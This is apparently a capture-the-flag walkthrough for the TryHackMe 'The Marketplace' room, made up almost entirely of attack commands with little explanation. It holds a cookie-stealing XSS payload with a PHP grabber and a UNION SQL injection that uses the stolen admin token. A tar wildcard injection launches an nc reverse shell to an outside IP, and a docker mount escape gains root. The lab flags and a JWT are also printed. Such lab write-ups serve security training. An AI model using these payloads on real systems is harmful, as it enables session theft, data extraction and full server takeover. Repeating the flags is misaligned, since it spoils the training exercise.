# <div align="center">[The Marketplace](https://tryhackme.com/r/room/marketplace)</div>
<div align="center">Can you take over The Marketplace's infrastructure?</div>

<div align="center">
<img src="https://github.com/user-attachments/assets/e5dd3e52-6ba0-4cee-a3fc-5a3c86816ac8" height="200"></img>
</div>

## Task 1. The Marketplace

The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.

Can you take advantage of this and will you be able to gain root access on his server?

### What is flag 1?
```
nmap -sSCV -p- <IP>
<script>document.location='http://<my_own_IP>:8000/grabber.php?c='+document.cookie</script>

cat > grabber.php << EOF
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
EOF

nc -nlvp 8000
GET /grabber.php?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig HTTP/1.1
GET /admin HTTP/1.1
```
```
THM{c37a63895910e478f28669b048c348d5}
```
### What is flag 2? (User.txt)
```
curl -s --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MjE2NzQ1NjN9.SZDjFMO2_KIMpIoLWuD5Zt3fKggTM8AoTS7plL32uig" \
http://<IP>/admin?user=`urlencode "0 UNION SELECT 1,GROUP_CONCAT(message_content),3,4 FROM marketplace.messages"` | tail cat user.txt
```
```
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```
### What is flag 3? (Root.txt)
```
id michael
find / -type f -user michael -exec ls -l {} + 2>/dev/null
cat /opt/backups/backup.sh 
#!/bin/bash
echo "Backing up files...";
tar cf /opt/backups/backup.tar *

sudo -l
cat > /opt/backups/shell.sh << EOF
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.8.50.72 4444 >/tmp/f
EOF

chmod +x /opt/backups/shell.sh
touch "/opt/backups/--checkpoint=1"
touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
cd /opt/backups/
sudo -u michael /opt/backups/backup.sh

nc -nlvp 4444
id
docker image ls
python3 -c "import pty;pty.spawn('/bin/bash')"
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
id
cat /root/root.txt
```
```
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```

